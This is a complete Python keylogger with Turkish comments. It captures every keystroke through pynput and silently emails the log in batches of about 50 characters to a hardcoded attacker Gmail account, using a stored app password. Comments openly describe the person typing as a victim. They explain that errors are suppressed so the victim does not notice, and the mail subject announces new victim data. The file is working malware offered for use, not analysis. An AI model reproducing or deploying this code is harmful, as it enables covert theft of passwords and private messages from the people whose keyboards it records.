import smtplib
import threading
from pynput.keyboard import Key, Listener

# --- GÜVENLİK PİMİ YOK ---
# DİKKAT: Bu kod çalıştığında verileri direkt saldırgana (sana) gönderir.

# Küresel değişken: Basılan tuşlar burada birikecek
log_deposu = ""

def mail_gonder(mesaj):
    # --- SALDIRGAN YAPILANDIRMASI ---
    # Hacker'ın (Senin) Mail Adresin
    saldirgan_email = "tabdulkadir233@gmail.com"
    
    # Senin Google 'Uygulama Şifren' (Gerçek şifreni buraya yazma!)
    saldirgan_sifre = "xkqz abcd efgh ijkl" 
    
    # Veriler kime gidecek? Yine sana (Kendinden kendine mail atıyorsun)
    alici_email = saldirgan_email 

    try:
        # Gmail Sunucusuna Bağlan (Port 587)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls() # Bağlantıyı şifrele (TLS)
        
        # Senin hesabınla giriş yap
        server.login(saldirgan_email, saldirgan_sifre)
        
        # Mail İçeriğini Hazırla
        konu = "KEYLOGGER RAPORU: Yeni Kurban Verisi"
        icerik = f"Subject: {konu}\n\n{mesaj}"
        
        # GÖNDER!
        server.sendmail(saldirgan_email, alici_email, icerik.encode('utf-8'))
        server.quit()
        
    except Exception as e:
        # Hata olsa bile sessiz kal (Kurban fark etmesin)
        pass

def tus_yakala(key):
    global log_deposu
    
    # Basılan tuşu okunabilir hale getir
    try:
        if hasattr(key, 'char'): # Normal harfler (a, b, c...)
            log_deposu += key.char
        elif key == Key.space:   # Boşluk
            log_deposu += " "
        elif key == Key.enter:   # Enter (Alt satır)
            log_deposu += "\n[ENTER]\n"
        elif key == Key.backspace: # Silme
            log_deposu += "[SIL]"
        else:
            # Diğer özel tuşlar (Shift, Ctrl vb.)
            pass 
            
    except Exception:
        pass

    # --- TETİKLEME MEKANİZMASI ---
    # Depoda 50 karakter birikti mi?
    if len(log_deposu) > 50:
        # Biriken veriyi saldırgana (sana) postala
        thread_mail = threading.Thread(target=mail_gonder, args=(log_deposu,))
        thread_mail.start()
        
        # Depoyu boşalt, yeni verilere yer aç
        log_deposu = ""

def ajani_baslat():
    print(f"[*] KEYLOGGER AKTİF.")
    print(f"[*] Veriler şu adrese akacak: tabdulkadir233@gmail.com")
    print(f"[*] Dinleme başladı... (Kurban yazmaya başladığında mail gelecek)")
    
    # Arka planda klavyeyi dinle
    with Listener(on_press=tus_yakala) as listener:
        listener.join()

if __name__ == "__main__":
    ajani_baslat()